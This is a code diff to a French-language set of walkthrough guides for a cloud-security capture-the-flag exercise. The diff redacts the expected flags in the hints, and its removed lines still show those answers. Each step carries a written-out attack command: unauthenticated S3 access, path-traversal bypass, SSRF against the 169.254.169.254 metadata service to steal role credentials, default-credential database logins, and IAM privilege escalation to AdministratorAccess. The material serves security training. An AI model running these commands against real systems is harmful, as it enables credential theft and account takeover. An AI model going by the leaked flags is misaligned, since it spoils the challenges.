@@ -37,7 +37,7 @@ export const guides: Record<string, ChallengeGuide> = {
       },
       {
         title: "Énumération des ressources",
-        detail: "Lancez une requête d'énumération non authentifiée vers les ressources cibles (par exemple un bucket ou une API publique). Le flag attendu est **PCE{unauth_s3_buck3t_enum_2026}**.",
+        detail: "Lancez une requête d'énumération non authentifiée vers les ressources cibles (par exemple un bucket ou une API publique). Le flag attendu est **PCE{...}**.",
         command: "aws s3api get-bucket-acl --bucket <target_bucket> --no-sign-request"
       }
     ]
@@ -55,7 +55,7 @@ export const guides: Record<string, ChallengeGuide> = {
       },
       {
         title: "Exploitation de l'endpoint vulnérable",
-        detail: "Accédez à l'endpoint contenant des données sensibles ou des fonctionnalités d'administration non protégées. Le flag attendu est **PCE{api_gw_unprotected_2026}**.",
+        detail: "Accédez à l'endpoint contenant des données sensibles ou des fonctionnalités d'administration non protégées. Le flag attendu est **PCE{...}**.",
         command: "curl -s https://<api_id>.execute-api.<region>.amazonaws.com/prod/admin/flag"
       }
     ]
@@ -73,7 +73,7 @@ export const guides: Record<string, ChallengeGuide> = {
       },
       {
         title: "Identification et récupération du flag",
-        detail: "Visitez le sous-domaine découvert qui expose publiquement des informations critiques. Le flag attendu est **PCE{passive_recon_reveals_all_2024}**.",
+        detail: "Visitez le sous-domaine découvert qui expose publiquement des informations critiques. Le flag attendu est **PCE{...}**.",
         command: "curl -s https://<hidden_subdomain>.<target_domain>/flag"
       }
     ]
@@ -91,7 +91,7 @@ export const guides: Record<string, ChallengeGuide> = {
       },
       {
         title: "Exfiltration du fichier caché",
-        detail: "Un prefix interne a été deviné (ou fuité). Vous pouvez télécharger le fichier spécifique sans avoir besoin de lister le bucket entier. Le flag attendu est **PCE{s3_exfil_hidden_prefix_2024}**.",
+        detail: "Un prefix interne a été deviné (ou fuité). Vous pouvez télécharger le fichier spécifique sans avoir besoin de lister le bucket entier. Le flag attendu est **PCE{...}**.",
         command: "aws --no-sign-request --endpoint-url http://localhost:9000 s3 cp s3://pce-marketing-public/internal/hr/employees-export.csv -"
       }
     ]
@@ -109,7 +109,7 @@ export const guides: Record<string, ChallengeGuide> = {
       },
       {
         title: "Contournement via normalisation",
-        detail: "Utilisez des séquences comme `../` ou une normalisation de chemin pour atteindre l'endpoint protégé via un endpoint public. Le flag attendu est **PCE{api_gateway_path_normalization_bypass_2024}**.",
+        detail: "Utilisez des séquences comme `../` ou une normalisation de chemin pour atteindre l'endpoint protégé via un endpoint public. Le flag attendu est **PCE{...}**.",
         command: "curl -s 'https://<api_id>.execute-api.<region>.amazonaws.com/prod/public/..%2fadmin/flag'"
       }
     ]
@@ -127,7 +127,7 @@ export const guides: Record<string, ChallengeGuide> = {
       },
       {
         title: "Connexion à la base de données",
-        detail: "Utilisez un client de base de données (ex: psql, mysql) avec les identifiants par défaut ou fuités pour vous connecter et extraire les données. Le flag attendu est **PCE{rds_pUbl1c_2024}**.",
+        detail: "Utilisez un client de base de données (ex: psql, mysql) avec les identifiants par défaut ou fuités pour vous connecter et extraire les données. Le flag attendu est **PCE{...}**.",
         command: "psql -h <rds_endpoint>.rds.amazonaws.com -U postgres -c 'SELECT flag FROM secrets;'"
       }
     ]
@@ -145,7 +145,7 @@ export const guides: Record<string, ChallengeGuide> = {
       },
       {
         title: "Exploitation du service exposé",
-        detail: "Connectez-vous au service mal protégé pour récupérer le flag. Le flag attendu est **PCE{cloud_sg_too_permissive_2024}**.",
+        detail: "Connectez-vous au service mal protégé pour récupérer le flag. Le flag attendu est **PCE{...}**.",
         command: "redis-cli -h <target_ip> GET flag"
       }
     ]
@@ -163,7 +163,7 @@ export const guides: Record<string, ChallengeGuide> = {
       },
       {
         title: "Utilisation des privilèges élevés",
-        detail: "Configurez l'AWS CLI avec ces nouvelles clés et récupérez le flag depuis un service protégé (ex: Parameter Store ou S3). Le flag attendu est **PCE{passrole_createaccesskey_escalation_2024}**.",
+        detail: "Configurez l'AWS CLI avec ces nouvelles clés et récupérez le flag depuis un service protégé (ex: Parameter Store ou S3). Le flag attendu est **PCE{...}**.",
         command: "AWS_ACCESS_KEY_ID=<new_key> AWS_SECRET_ACCESS_KEY=<new_secret> aws ssm get-parameter --name /flag --with-decryption"
       }
     ]
@@ -181,7 +181,7 @@ export const guides: Record<string, ChallengeGuide> = {
       },
       {
         title: "Récupération du flag avec la nouvelle identité",
-        detail: "Utilisez les clés générées (AccessKeyId, SecretAccessKey, SessionToken) pour accéder aux ressources de ce rôle. Le flag attendu est **PCE{assume_role_pivot_2024}**.",
+        detail: "Utilisez les clés générées (AccessKeyId, SecretAccessKey, SessionToken) pour accéder aux ressources de ce rôle. Le flag attendu est **PCE{...}**.",
         command: "AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=... aws s3 cp s3://<protected_bucket>/flag.txt - "
       }
     ]
@@ -199,7 +199,7 @@ export const guides: Record<string, ChallengeGuide> = {
       },
       {
         title: "Lecture du flag dans l'environnement",
-        detail: "Analysez la réponse de la Lambda pour récupérer les variables d'environnement contenant le flag et les credentials temporaires de la Lambda. Le flag attendu est **PCE{lambda_cmd_injection_2026}**.",
+        detail: "Analysez la réponse de la Lambda pour récupérer les variables d'environnement contenant le flag et les credentials temporaires de la Lambda. Le flag attendu est **PCE{...}**.",
         command: "echo \"Le flag est dans les variables d'environnement renvoyées par la commande env.\""
       }
     ]
@@ -217,7 +217,7 @@ export const guides: Record<string, ChallengeGuide> = {
       },
       {
         title: "Escalade et récupération du flag",
-        detail: "Attachez AdministratorAccess à votre compte pour prendre le contrôle total, puis lisez le flag. Le flag attendu est **PCE{iam_attach_policy_privesc_2024}**.",
+        detail: "Attachez AdministratorAccess à votre compte pour prendre le contrôle total, puis lisez le flag. Le flag attendu est **PCE{...}**.",
         command: "aws iam attach-user-policy --user-name <votre_user> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
       }
     ]
@@ -235,7 +235,7 @@ export const guides: Record<string, ChallengeGuide> = {
       },
       {
         title: "Vol des identifiants (STS)",
-        detail: "Récupérez les AccessKey, SecretKey et SessionToken du rôle. Le flag attendu est **PCE{imds_ssrf_stolen_role_creds_2024}**.",
+        detail: "Récupérez les AccessKey, SecretKey et SessionToken du rôle. Le flag attendu est **PCE{...}**.",
         command: "curl 'http://<target_app>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>'"
       }
     ]
@@ -253,7 +253,7 @@ export const guides: Record<string, ChallengeGuide> = {
       },
       {
         title: "Utilisation du token pour l'exfiltration",
-        detail: "Réutilisez le token récupéré dans une nouvelle requête SSRF pour accéder aux credentials. Le flag attendu est **PCE{1mdsv2_byp4ss_h34d3rs_2026}**.",
+        detail: "Réutilisez le token récupéré dans une nouvelle requête SSRF pour accéder aux credentials. Le flag attendu est **PCE{...}**.",
         command: "curl -X POST -d 'method=GET&url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>&headers[X-aws-ec2-metadata-token]=<votre_token>' 'http://<target_app>/proxy'"
       }
     ]
@@ -271,7 +271,7 @@ export const guides: Record<string, ChallengeGuide> = {
       },
       {
         title: "Accès au service interne",
-        detail: "Interagissez avec l'API interne découverte (ex: un serveur d'administration local) pour récupérer le flag. Le flag attendu est **PCE{ssrf_m3t4d4t4_2026}**.",
+        detail: "Interagissez avec l'API interne découverte (ex: un serveur d'administration local) pour récupérer le flag. Le flag attendu est **PCE{...}**.",
         command: "curl 'http://<target_app>/fetch?url=http://10.0.0.54:8080/admin/flag'"
       }
     ]
